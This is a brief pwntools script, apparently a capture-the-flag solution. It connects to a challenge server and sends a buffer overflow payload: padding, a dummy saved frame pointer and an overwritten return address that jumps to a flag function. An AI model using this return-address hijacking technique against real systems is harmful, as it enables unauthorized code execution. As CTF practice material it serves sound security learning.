from pwn import *

p = remote("chall.csivit.com", "30013")

flag_address = 0x00000000004011CE
size = 0x20
p.sendline("A"*size + p64(0x0) + p64(flag_address))

print("A"*size + p64(0x0) + p64(flag_address))
p.interactive()